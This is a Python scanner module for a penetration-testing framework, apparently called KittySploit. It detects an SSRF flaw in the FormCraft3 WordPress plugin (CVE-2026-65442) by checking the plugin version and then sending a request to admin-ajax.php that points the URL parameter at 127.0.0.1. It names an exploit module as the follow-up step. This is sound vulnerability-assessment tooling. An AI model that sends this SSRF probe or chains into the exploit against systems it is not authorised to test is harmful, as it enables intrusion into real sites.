#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""FormCraft3 <= 3.9.15 SSRF (CVE-2026-65442)."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.wordpress import Wordpress

_PLUGIN = "formcraft3"
_VULN_HIGH = (3, 9, 15)


class Module(Scanner, Http_client, Wordpress):
    __info__ = {
        "name": "FormCraft3 CVE-2026-65442 SSRF detect",
        "description": "Detects formcraft3_get admin-ajax SSRF surface.",
        "author": ["KittySploit Team"],
        "severity": "high",
        "cve": "CVE-2026-65442",
        "references": ["https://nvd.nist.gov/vuln/detail/CVE-2026-65442"],
        "modules": ["auxiliary/admin/http/formcraft_cve_2026_65442_ssrf"],
        "tags": ["web", "scanner", "wordpress", "formcraft", "ssrf", "cve-2026-65442"],
        "agent": {
            "approval_required": True,
            "chain": {"suggested_followups": ["auxiliary/admin/http/formcraft_cve_2026_65442_ssrf"]},
        },
    }

    base_path = OptString("/", "WordPress base path", required=False)

    def _join(self, suffix: str) -> str:
        base = self.wp_normalize_base_path(self.base_path or "/")
        if not suffix.startswith("/"):
            suffix = "/" + suffix
        return f"{base}{suffix}" if base != "/" else suffix

    def run(self):
        base = self.wp_normalize_base_path(self.base_path or "/")
        version = self.wp_plugin_version(_PLUGIN, base) or ""
        if version and not self.wp_version_in_range(version, (0, 0, 0), _VULN_HIGH):
            return False
        home = self.http_request(method="GET", path=self._join("/"), allow_redirects=True)
        if not home or "/wp-content/plugins/formcraft3/" not in (home.text or ""):
            return False
        probe = self.http_request(
            method="GET",
            path=self._join("/wp-admin/admin-ajax.php"),
            params={"action": "formcraft3_get", "URL": "http://127.0.0.1/"},
            allow_redirects=False,
            timeout=15,
        )
        if probe and int(probe.status_code or 0) in (200, 400, 500):
            self.set_info(
                severity="high",
                reason="FormCraft3 formcraft3_get accepts URL parameter",
                path="/wp-admin/admin-ajax.php",
                cve="CVE-2026-65442",
            )
            return True
        return False
